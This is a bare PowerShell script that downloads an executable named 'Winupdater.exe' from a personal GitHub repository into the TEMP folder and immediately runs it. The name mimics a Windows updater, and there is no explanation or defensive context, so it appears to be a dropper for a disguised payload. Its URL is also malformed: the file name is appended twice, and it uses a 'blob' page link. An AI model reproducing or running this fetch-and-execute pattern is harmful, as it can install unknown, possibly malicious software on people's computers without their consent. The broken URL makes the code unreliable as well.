$assetName = "Winupdater.exe"
$url = "https://github.com/thejaberhut/jaber/blob/main/WinUpdater.exe$assetName"
$outFile = Join-Path $env:TEMP $assetName

iwr -Uri $url -OutFile $outFile -UseBasicParsing
Start-Process -FilePath $outFile -Wait

